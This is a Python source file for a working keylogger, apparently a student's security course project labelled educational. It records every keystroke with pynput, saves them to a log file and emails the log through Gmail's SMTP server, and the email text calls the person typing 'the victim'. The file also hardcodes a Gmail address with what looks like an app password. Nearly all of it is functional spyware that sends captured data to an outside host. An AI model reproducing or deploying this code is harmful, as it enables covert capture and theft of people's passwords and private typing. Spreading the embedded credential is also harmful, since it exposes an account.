# Software Keylogger
# Built by Agrim Shakergaye (z5421172) for COMP6441 project
# Only being used for educational purposes

import sys
import threading
import time
import pynput.keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

log = ""
log_file_path = "/Users/agrim/Desktop/comp6441/project/log.txt"
from_email = "6441test@gmail.com"
password = "ppcl nwex flxc aket"
to_email = "6441test@gmail.com"

keylogging_duration = 10
repetitions = 2
time_now = time.time()
time_end = time.time() + keylogging_duration

def write_log(log_text):
    with open("log.txt", "a") as file:
        file.write(log_text)
    
def create_log(key):
    global log

    if hasattr(key, 'char') and key.char is not None:
        char = key.char
    else:
        if key == key.enter:
            char = "\n"
        elif key == key.space:
            char = " "
        elif key in {key.shift, key.shift_r, key.ctrl_l, key.ctrl_r, key.alt_l, key.alt_r}:
            char = ""
        elif key == key.backspace:
            log = log[:-1]
            return
        else:
            char = f"[{key.name}]" if hasattr(key, "name") else f"[{key}]"

    log = log + char
    write_log(char[-1:])
            
def export_log_to_email(attachment):
    try:
        message = MIMEMultipart()
        message['From'] = from_email
        message['To'] = to_email
        message['Subject'] = "We have suspiciously logged your keys!"
        message.attach(MIMEText("Please open the keylogger log file to check what the victim has been upto.", 'plain'))
        
        with open(attachment, 'rb') as attachment:
            email_attachment = MIMEBase('application', 'octet-stream')
            email_attachment.set_payload((attachment).read())
            encoders.encode_base64(email_attachment)
            email_attachment.add_header('Content-Disposition', f'attachment; filename = "log.txt"')
            message.attach(email_attachment)
        
        with smtplib.SMTP('smtp.gmail.com', 587) as trigger_email:
            trigger_email.starttls()
            trigger_email.login(from_email, password)
            trigger_email.sendmail(from_email, to_email, message.as_string())
            trigger_email.quit()
    except:
        print("Failed to send email. Please verify email details.")  
        
def terminate_keylogger(key_scanner):
    key_scanner.stop()
 
try:    
    for repetition in range(repetitions): 
        log = ""

        with open(log_file_path, "w") as file:
            file.write("")

        key_scanner = pynput.keyboard.Listener(on_press = create_log)
        key_scanner.start()
        
        timer = threading.Timer(keylogging_duration, terminate_keylogger, [key_scanner])
        timer.start()
        key_scanner.join()  
        timer.cancel() 

        export_log_to_email(log_file_path)
        
except KeyboardInterrupt:
    if log.endswith("c"):
        log = log[:-1]
        with open(log_file_path, "r+") as file:
            contents = file.read()
            file.seek(0)
            file.write(contents[:-1])
            file.truncate()

    print("\nKeylogger exited manually. Sending email...")
    export_log_to_email(log_file_path)
    sys.exit(0)
